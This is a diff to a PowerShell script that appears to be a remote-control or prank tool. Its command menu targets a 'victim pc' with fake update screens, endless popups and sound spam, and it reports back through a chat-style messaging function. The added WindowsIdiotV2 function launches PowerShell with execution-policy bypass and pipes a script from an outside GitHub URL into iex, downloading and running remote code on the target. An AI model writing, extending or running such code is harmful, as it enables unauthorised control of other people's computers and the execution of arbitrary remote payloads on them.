@@ -308,6 +308,7 @@ $script:jsonPayload = @{
 - **FakeUpdate**: Spoof Windows-10 update screen using Chrome
 - **Windows93**: Start parody Windows93 using Chrome
 - **WindowsIdiot**: Start fake Windows95 using Chrome
+- **WindowsIdiotV2**: Simulate windows idiot prank on the victim pc
 - **SendHydra**: Never ending popups (use killswitch) to stop
 - **SoundSpam**: Play all Windows default sounds on the target
 - **Message**: Send a message window to the User (!user popup!)
@@ -866,6 +867,12 @@ WshShell.SendKeys "{F11}"
     Remove-Item -Path $pth -Force
     sendMsg -Message ":arrows_counterclockwise: ``Windows Idiot Sent..`` :arrows_counterclockwise:"
 }
+
+Function WindowsIdiotV2 {
+    Start-Process PowerShell.exe -ArgumentList ("-NoP -Ep Bypass -C irm https://raw.githubusercontent.com/Lore-Bul/winidiot/refs/heads/main/main.ps1 | iex")
+    sendMsg -Message ":white_check_mark: ``Win idiot is running`` :white_check_mark:"  
+}
+
 
 Function SendHydra {
     Add-Type -AssemblyName System.Windows.Forms
